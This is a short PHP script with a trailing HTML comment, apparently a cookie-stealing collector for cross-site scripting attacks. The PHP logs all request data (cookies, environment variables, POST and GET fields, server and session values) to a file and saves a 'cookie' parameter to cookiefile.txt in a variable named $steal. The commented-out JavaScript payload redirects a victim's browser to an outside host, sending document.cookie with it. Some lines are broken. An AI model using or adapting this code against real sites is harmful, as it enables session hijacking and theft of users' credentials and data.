

<?php
    $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
    fwrite($myfile, "---111\n");
    // $headers =  getallheaders();
    // foreach($headers as $key=>$val){
    //     fwrite($key . ': ' . $val . '\n');
    // }
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_COOKIE)));
    fwrite($myfile, join(', ', $_COOKIE));
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_ENV)));
    fwrite($myfile, join(', ', $_ENV));
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_FILES)));
    fwrite($myfile, join(', ', $_FILES));
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_GET)));
    fwrite($myfile, join(', ', $_GET));
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_POST)));
    fwrite($myfile, join(', ', $_POST));
    fwrite($myfile, "---\n");
    fwrite($myfile, join(', ', array_keys($_REQUEST)));
    fwrite($myfile, join(', ', $_REQUEST));
    fwrite($myfile, "SERVER---\n");
    fwrite($myfile, join(', ', array_keys($_SERVER)));
    fwrite($myfile, join(', ', $_SERVER));
    fwrite($myfile, "SESSION---\n");
    fwrite($myfile, join(', ', array_keys($_SESSION)));
    fwrite($myfile, join(', ', $_SESSION));
    fwrite($myfile, "HEADERS---\n");
    fwrite($myfile, join(', ', array_keys($_HEADERS)));
    fwrite($myfile, join(', ', $_HEADERS));
    fwrite($myfile, "###BB\n");
    fclose($myfile);

    $cookie = $HTTP_GET_VARS["cookie"];
    $steal = fopen("cookiefile.txt", "a");
    fwrite($steal, $cookie ."\n");
    fclose($steal);




?>

<!--The best lifehack is hugging people.
<script language="JavaScript">
document.location= " http://appinez.com/get_cookie.php?c=" + document.cookie; </script>-->